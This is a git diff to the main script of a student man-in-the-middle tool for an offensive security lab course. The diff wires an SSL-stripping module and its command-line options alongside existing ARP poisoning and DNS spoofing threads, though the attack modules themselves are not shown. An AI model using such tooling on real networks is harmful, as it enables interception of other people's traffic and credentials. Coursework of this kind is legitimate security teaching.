@@ -4,6 +4,7 @@ import threading
 from termcolor import colored
 from scripts.arp_poisoner import ArpPoisoner
 from scripts.dns_poisoner import DnsSpoofer
+from scripts.ssl_stripper import SslStripper
 
 VERSION = "1.0"
 
@@ -17,6 +18,10 @@ CONFIG = {
     "dns": {
         "hosts": None,
         "spoofing": False # Performing dns spoofing
+    }, 
+    "ssl": {
+        "disable": False,  # Disable SSL stripping
+        "port": 80  # Port to listen for spoofed webserver traffic
     }
 }
 
@@ -57,6 +62,10 @@ def parse_args():
                     hostList.append(i.rstrip('\n'))
                 CONFIG["dns"]["hosts"] = hostList
                 CONFIG["dns"]["spoofing"] = True
+            elif arg[0] == "-sD":
+                CONFIG["ssl"]["disable"] = True
+            elif arg[0] == "-sP":
+                CONFIG["ssl"]["port"] = int(arg[1])
             else:
                 print("Error: Unknown argument '{}': '{}'".format(arg[0], arg[1]))
                 print("Use -h or --help for usage information.")
@@ -105,12 +114,10 @@ def print_art():
 def print_welcome():
     print_art()
 
-    print(f"{colored("Automated SSL Stripper", "light_green")} by "
-          f"{colored("group 13", "blue")} made for the course "
-          f"{colored("2IC80 - Lab on Offensive Computer Security", "red")}.")
-    print(f"Version: {VERSION}")
-
-    print("\nUse -h or --help for usage information.\n")
+    print(colored("Automated SSL Stripper", "light_green") + " by " +
+          colored("group 13", "blue") + " made for the course " +
+          colored("2IC80 - Lab on Offensive Computer Security", "red") + ".")
+    print("Version: {}\n".format(VERSION))
 
 
 def start():
@@ -126,9 +133,17 @@ def start():
     arp_poisoner = ArpPoisoner(target_ip, gateway_ip, poisoning_interval, ignore_cache)
     t1 = threading.Thread(target=lambda: arp_poisoner.start())
     t1.daemon = True
-    t1.start()   
+    t1.start()  
 
     # RUN ADDITIONAL SCRIPTS HERE
+    
+    disable_ssl = CONFIG["ssl"]["disable"]
+
+    if not disable_ssl:
+        ssl_port = CONFIG["ssl"]["port"]
+
+        ssl_stripper = SslStripper(ssl_port)
+        ssl_stripper.start()
 
     # Run DNS poisoning script
     if (CONFIG["dns"]["spoofing"]):
